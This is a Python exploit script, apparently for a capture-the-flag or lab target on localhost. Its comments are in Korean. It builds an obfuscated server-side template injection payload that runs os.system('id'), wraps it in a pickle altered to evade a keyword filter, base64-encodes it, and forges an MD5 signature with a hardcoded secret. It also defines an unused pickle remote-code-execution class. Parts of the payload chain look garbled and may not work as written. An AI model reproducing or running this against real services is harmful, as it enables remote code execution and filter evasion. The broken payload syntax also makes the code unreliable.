import pickle
import base64
import hashlib
import requests
import re

TARGET_URL = "http://localhost:8090/process"
SECRET_KEY = "very_secret_key_do_not_guess"  # 실제 상황에서는 이를 알아내는 과정이 필요합니다

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system, ("id",))

def create_signature(data):
    return hashlib.md5((data + SECRET_KEY).encode()).hexdigest()

def create_payload():
    # SSTI 페이로드를 포함한 딕셔너리 생성
    ssti_payload = {
        'template': "{{''.__class__.__mro__[1].__subclasses__()[400:500]|select('__init__')|map(func_closure=(attrs.__itemgetter__('__globals__')|last)|map(funcs.split|last|getattr=('__buil''tins__','eva''l'))|first('im''port o''s;os.sys''tem(\"id\")'))}}"
    }
    
    # Pickle을 사용하여 직렬화
    pickled = pickle.dumps(ssti_payload)
    
    # 'pickle' 문자열 회피를 위한 인코딩
    encoded = base64.b64encode(pickled.replace(b'pickle', b'p1ckl3')).decode()
    
    return encoded

def exploit():
    payload = create_payload()
    signature = create_signature(payload)
    
    data = {
        'data': payload,
        'signature': signature
    }
    
    response = requests.post(TARGET_URL, data=data)
    print("Response status:", response.status_code)
    print("Response content:")
    print(response.text)
    
    # 실행 결과 추출
    match = re.search(r'uid=\d+\(.*?\) gid=\d+\(.*?\)', response.text)
    if match:
        print("\nExecution result:", match.group())
    else:
        print("\nFailed to extract execution result.")

if __name__ == "__main__":
    exploit()